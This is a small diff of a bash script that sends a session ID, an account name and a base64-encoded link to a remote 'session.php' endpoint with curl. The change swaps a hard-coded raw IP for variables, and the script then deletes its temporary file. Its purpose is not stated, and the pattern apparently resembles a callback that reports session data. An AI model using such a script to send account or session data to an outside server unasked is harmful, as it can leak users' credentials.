@@ -1,5 +1,7 @@
 #/bin/bash
 
+source http
+
 session=$1
 account=$2
 
@@ -19,7 +21,7 @@ echo ${url:47:609} | base64 -w 0 > $session.url
 
 link=$(cat $session.url)
 
-url='http://51.81.101.99/session.php?session='$session'&account='$account'&status=1&url='$link
+url=$protocolo$ip'/session.php?session='$session'&account='$account'&status=1&url='$link
 curl $url
 
 rm -rf $session.url
